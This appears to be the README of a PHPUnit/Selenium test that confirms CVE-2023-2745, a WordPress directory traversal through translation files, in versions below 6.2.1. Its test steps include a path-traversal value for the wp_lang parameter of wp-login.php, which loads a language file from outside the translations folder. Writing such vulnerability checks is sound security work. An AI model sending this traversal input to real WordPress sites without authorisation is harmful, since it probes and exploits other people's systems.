# PHPUnit Selenium test to confirm CVE-2023-2745 directory traverse via translation files vulnerability

## Test Case covered
### Pre-conditions:
- Target wordpress website is `http://targetwordpress.site`
- Website default locale is set to 'en_EN' 
- Default translations folder is 'wp-content/languages/'
- English locale file is `wp-content/languages/en_EN.mo`
- Spanish locale file 'es_ES.mo' is downloaded and put to `wp-admin/es_ES.mo` (Also could be any other folder)
- All 'es_ES' locale files removed from 'wp-content/languages/'
		
### Test case 1: Confirm that vulnerable version of wordpress allows directory traverse via translation files
- Given:
    - Wordpress version <6.2.1
    - Remove all website cookies before each step
- Step 1:
    - Call 'http://targetwordpress.site/wp-login.php` 
    - Expected to see login page in English
- Step 2: 
    - Call 'http://targetwordpress.site/wp-login.php?wp_lang=es_ES`
    - Expected to see login page in English
- Step 3: 
    - Call 'http://targetwordpress.site/wp-login.php?wp_lang=../../wp-admin/es_ES`
    - Expected to see login page in Spanish	 
    - Expected website set cookie "wp_lang=../../wp-admin/es_ES"
    - Subsequently, without removing cookies, call 'http://targetwordpress.site/wp-login.php` 
    - Expected to see login page in Spanish

## requirements
PHP > 7.*
Composer
Chromedriver or Selenium server

## Installation
`gh repo clone sam-lopata/wordpress-selenium`

`cd wordpress-selenium`

`composer install`

## Run
Start  `chromedriver --port=4444`

or Selenium server, for example `java -jar selenium-server-standalone-3.9.1.jar`

Execute `./vendor/bin/phpunit -c phpunit-selenium.xml  --testdox` to run tests